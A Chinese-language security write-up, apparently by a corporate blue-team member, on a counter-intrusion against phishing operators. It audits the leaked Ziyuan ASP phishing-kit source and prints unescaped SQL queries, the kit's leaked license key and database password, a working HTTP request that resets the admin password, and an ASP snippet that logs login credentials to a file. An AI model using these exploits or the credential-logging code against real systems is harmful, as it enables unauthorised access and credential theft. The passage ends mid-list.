这次的案件源自于很久以前外部 HC 单位对某司的钓鱼攻击。文章中的源
码是 ASP 版本的钓鱼框架紫缘，但是 ASP 源码中存在越权访问漏洞所以可以才
得以打到攻击者的后台。在同段 IP 的扫描中根据中间件的版权信息可以获取同
类型的钓鱼管理后台。详细内容在后续章节逐一介绍攻破思路和方法。 
一、事件背景 
企业邮箱收到了仿造 Outlook Web App 界面的钓鱼邮件。应该是想要钓鱼
我们公司员工的邮箱账户。攻击者 Outlook 钓鱼页面： 
二、反制过程 
渗透测试是红队人员对目标单位的攻击，反制是目标单位的蓝队人员对红
队人员的反向渗透测试。所以把这个反红队过程也叫做反制。反制和渗透测试
一个正常网站没有差别。除了对目标 IP 的信息收集、漏洞挖掘外增加了同类系
统扩展扫描、受控范围定位、人头威胁情报的搜索。通用行业的渗透讲究找出
漏洞防患于未然，反制更多是对攻击者的一系列资产搜集，然后挖出受控者和
攻击者的身份信息为主。 
信息收集 
面对单个 IP 的信息收集，常用的方法是敏感文件、端口扫描、弱口令测
试、旁站域名。这里有一个技巧，主要的 C2 找不到后台的时候，扫描端口再
做目录扫描是可以有几率得到其他后台信息的。攻击者一样会做应用和管理后
台分离访问。图中的 2301 端口就是可疑端口，下图是端口扫描的结果： 
弱口令测试漏洞挖掘 
除了 SSH 和 RDP 暴力破解外，这些服务性质的端口是可以尝试的。扫描出
来的 21 服务类端口 FTP 做口令破解，可以看到 FTP 有匿名访问，但登录之后访
问不到 WEB 文件。 
祭出 dirsearch 对后台做目录扫描, 对 80 端口扫描不出敏感文件的时候，换
到不同端口再尝试扫描网页文件。这次切换的是 2301 端口敏感文件扫描得到后
台页面：http://xxx.xxx.xxx.xxx:2301/admin.asp。其中比较有用的信息，
MANAGEQQ 管理系统，紫缘设计工作室(WWW.CKZZ.NET) 
扫描出来的后台已经暴露出钓鱼程序名称、版本年限、端口、源码里面也
有特别的字符，在百度网盘搜索引擎搜索能得到很多结果。 花时间在找源码的
过程比较长，复现文章时网盘搜索已经搜索不出来了，仅存的几个 ASP 源码已
经取消分享。以下是我在百度网盘搜索引擎里搜索得到的紫缘钓鱼源码架构截
图： 
搭建起来版本号是 20150502 的，跟目标源码长得不太一样。但是测试的
几个文件都是跟目标站一样的。后台样式截图如下： 
ASP 代码审计跟审计其他脚本语言区别不大，我觉得小语种代码审计虽然
没有编辑器可以很方便调试输出结果，但是利用输出语句和条件判断、终止语
句能跑起来就可以实现对小语种代码审计，因为调试器起到的作用就是断点和
输出变量的作用而已，熟悉原理一样可以实现调试和分析。 
ASP 调试和执行 SQL 语句的方法说明： 
输出语句 
Response.Write ""&username&"' ------ '"&password&"" 
数据库操作 
set rs=server.CreateObject("adodb.recordset") ‘建立一个数据集 
set rs=server.CreateObject("adodb.recordset") ‘建立一个数据集的实
例 
rs.open ...... ‘打开一个记录集 
rs.addnew ‘添加记录到数据表末端 
rs.update ‘更新数据表记录 
这款 ASP 钓鱼源码比较简单，没有上传、命令执行类漏洞可以直接利用，
XSS 之前已经黑盒子试过了没有反馈，感觉应该是做了过滤。况且已经扫到后
台地址，拿到源码后先看看有没有机会可以越权进后台页面拿到受控者的数
据。 
从配置文件开始找起，在 WEB 根目录里的 Web.box 文件 89 行，可以看到
访问 2301 端口是指向管理后台目录\wwwroot\_Manager_##_#@#。 
# 设置 NetBox.HttpServer 对象 
Set http3 = CreateObject("NetBox.HttpServer") 
# 监听 2301 端口 
If http3.Create("", "2301") = 0 Then 
# 添加访问目录 
Set www = http3.AddHost("", "\wwwroot\_Manager_##_#@#") 
www.EnableScript = true 
www.AddDefault "ckzz_ec.asp" 
http3.Start 
end if 
搜索紫缘设计工作室(WWW.CKZZ.NET) 在
wwwroot\_manager_##_#@#\index.asp 找到了后台登录验证页面。自己下载一
个 netbox 加载 web.box 就可以脱离紫缘已经封装好的源码了, 因为配置参数都
是默认有的。后台的界面比较少，没找到可以不登录就直接访问的页面。遂放
弃 
SQL 注入漏洞挖掘 
源码很多地方都是没有过滤就调用外部传参的变量。管理员表 Manager，
字段名 ZY_UserName、ZY_PassWord。密码加密方式有点变态，SQL 注入出来
密文稍微复杂点的明文密码肯定是解不开了。 
数据库表名搜索到的查询语句部分传参到数据库中查询，但是 SQL 注入读
取出来的密码很难解开的。原理是先用 sha256 加密了一次除去密码的空格，然
后用 base64Encode 编码后再 sha256 加密一次，具体源码部分如下： 
# 数据库查询部分 
sql="Select * from Manager where ZY_UserName='" & username &"' and 
ZY_PassWord='"& PassWord &"'" 
# 密码加密方式 
password=sha256(base64Encode(sha256(replace(trim(request("password"
)),"'","")))) 
登录部分不会解开密文成明文，而是把用户登录的明文密码用同样加密方
式把明文密码加密后对比存在数据库里的密文密码。当时钓鱼站点存在的时候
由于 Access 数据库的 SQL 注入不知道 WEB 目录的绝对路径，没法导出
webshell。也就直接放弃继续搜索 SQL 注入的想法。登录界面认证部分代码
wwwroot\_manager_##_#@#\index.asp 23~52 行： 
'提交验证开始 
if Request.form.count>0 then 
ip=request.ServerVariables("REMOTE_ADDR") 
session("fileget")=Server.MapPath(".") 
‘ 接收用户名 
username=replace(trim(request("username")),"'","") 
‘ 加密密码对比数据库里的密文 
password=sha256(base64Encode(sha256(replace(trim(request("password"
)),"'","")))) 
Session("passwordup")=base64Encode(sha256(base64Encode(mid(sha256(r
equest.form("passwordup")),16,32)+mid(Reg("ckzz_gen_key"),8,16)))) 
CheckCode=replace(trim(request("CheckCode")),"'","") 
'判断管理帐户和密码不能为空 
If username="" or password="" then 
Call Box("管理帐户和登入密码不能填空！") 
End if 
'判断验证码 
If cstr(trim(session("getcode"))) <> cstr(trim(Request("code"))) 
then 
Call boxurl("验证码错误，返回重新输入！","?") 
End If 
'验证开始 
set Rs=Server.CreateObject("adodb.recordset") 
sql="Select * from Manager where ZY_UserName='" & username &"' and 
ZY_PassWord='"& PassWord &"'" 
rs.open sql,conn,1,1 
if rs.eof and rs.bof then 
Call Infozt("登入帐户或密码错误！") 
Call Box("管理帐户或登入密码不正确，请重新输入！") 
else 
'帐户被禁用或远程关闭 
if rs("kick")=true then 
Call Infozt("登入帐户已禁用！") 
Call Box("管理帐户被禁用或于主站关闭登录权限！") 
end if 
Call Infozt("登入密码验证完成，登录成功！") 
越权修改密码漏洞挖掘 
当已经确认 SQL 注入搞下来密码也破解不开密文，而且进了后台也不一定
拿 SHELL 后。就把找越权访问漏洞、SQL 注入漏洞、XSS 漏洞思路变换为找越
权修改漏洞，因为反制未必需要 webshell 才能做到追踪攻击者。我按照
rs.update 更新数据表记录找了 4 处越权修改管理员密码漏洞。每一个都比上一
个验证玄幻。Haha~ 
越权 1-越权修改密码 
第 1 处越权修改密码漏洞主要是源自于紫缘是商业钓鱼框架，所以需要授
权码才能使用，但是网上的破解版本似乎泄露的授权码都是一样的。所以造成
了这个漏洞。 
搜索 request()函数找调用参数的时候发现/ckzz_ec.asp 文件的传参可以控
制。接收的 key 参数跟数据库里的 ckzz_gen_key 字段匹配就可以修改管理员密
码、重启服务。 
# 接收 action 参数 
If Request("action")="manager" Then 
dim username,password1,password2,rss 
Set Reg = Conn.Execute("Select * from ckzz_reg") 
username=request("username") 
password1=request("password") 
password2=request("tpassword") 
# 接收 key 参数 
key=request("key") 
if password1<>password2 then 
response.write "passerror" 
response.end 
End if 
# key 参数与数据库表里的 ckzz_gen_key 对比，如果错误就结束后续操作 
if key<>Reg("ckzz_gen_key") then 
response.write "keyerror" 
response.end 
set reg=nothing 
End If 
# 最后修改管理员密码 
set rs = Server.CreateObject("ADODB.RecordSet") 
sql = "select * from Manager where zy_username='"&username&"'" 
rs.open sql,conn,1,3 
rs("zy_password")=sha256(base64Encode(sha256(password1))) 
rs.update 
那么从代码看 ckzz_gen_key 是一个很重要的值，找数据库看看表结构就可
以清楚作用了。直接查看 MDB 数据库发现是有密码加密的。那么只好翻数据库
配置文件，然后看看正常逻辑下是怎么调用的数据库。 
NetBox("DBP")应该就是数据库的路径位置。然后全局搜索发现
NetBox("DBP")是调用的 web.box 里 11~14 行。Zy.dll 里的 CKZZ_DB()函数： 
Shell.RegisterServer "ZY.DLL" 
Shell.RegisterServer "Jmail.dll" 
Set ZYQQ = Netbox.CreateObject("ZY.QQ") 
path =NetBox.ApplicationPath  
NetBox.ConfigFile = path & "ManageQQ.ini"  
NetBox("DB")=ZYQQ.CKZZ_DB(1) 
NetBox("DBP")=ZYQQ.CKZZ_DB(2) 
ZY.DLL 查壳是 Microsoft Visual Basic 6.0 DLL 写的 DLL，VB 写的二进制文件
可以反编译看代码。这里可以看到反编译后的代码数据库调用路径是是
###www.ckzz.net###.accdb。数据库的加密密码是：www.ckzz.net.acc2003  
打开数据库得到 Ckzz_gen_key 字段的值是
94ebb60031c67eb0b42774de007dad3b，这段就是钓鱼程序的授权验证码。 
好的，拿出这个泄露后滥用的授权码，构造 HTTP 数据包在本地测试一
下。 
GET 
/ckzz_ec.asp?action=manager&username=admin&password=admin&tpassword
=admin&key=94ebb60031c67eb0b42774de007dad3b HTTP/1.1 
Host: 192.168.229.128:2301 
Cache-Control: max-age=0 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 
Safari/537.36 
Accept: 
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,im
age/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9 
Cookie: 
LRFZKRHDQNCTVVIMERCO=CKSRDIZMQNDMCSWBOWRWYNLJPTLUJUTFOCUYJOZC; 
OTOUPMOKFXIWFSKOEQID=MZGVGBDHXVMUHLEZWMCZXMZWEDNBJXXQGTUYSTZB 
Connection: close 
密码修改成功效果，显示出 editok 的时候，就感觉已经修改成功了。: 
为了验证数据库里的密码是不是已经被修改了。我使用程序后台界面自带
的 sha12base642sha1 的加密函数把明文密码加密后的密文跟数据库里的密文对
比了一下，为了验证我写了一段记录后台账户密码的 ASP 代码。往登录界面一
插就能用，然后用正确密码登录之后截取明文密码加密后的密文，后面越权漏
洞改管理员密文的时候还可以用到这几段密文。 
dim fs,f,sw 
Set fs = Server.CreateObject("Scripting.FileSystemObject") 
Const saveFilePath = "c:\test.txt" 
if fs.FileExists(saveFilePath) then 
set f=fs.OpenTextFile(saveFilePath,8,true) 
f.WriteLine("'"&username&"' ------ '"&password&"'") 
f.Close 
else 
Set f = fs.CreateTextFile(saveFilePath, True) 
f.WriteLine("'"&username&"' ------ '"&password&"'") 
f.Close 
end if 
set f=Nothing 
set fs=nothing 
对应的密文： 
'admin' ------ 
'70a647030002098aea97e7fcfa35fdcbf5cd5890f3de45af1df654f0995eb816' 
'admin1' ------ 
'171da850864661785aadecc3c725ef378f514cc823cedbdd427ce7fd4522923d' 
'123456' ------ 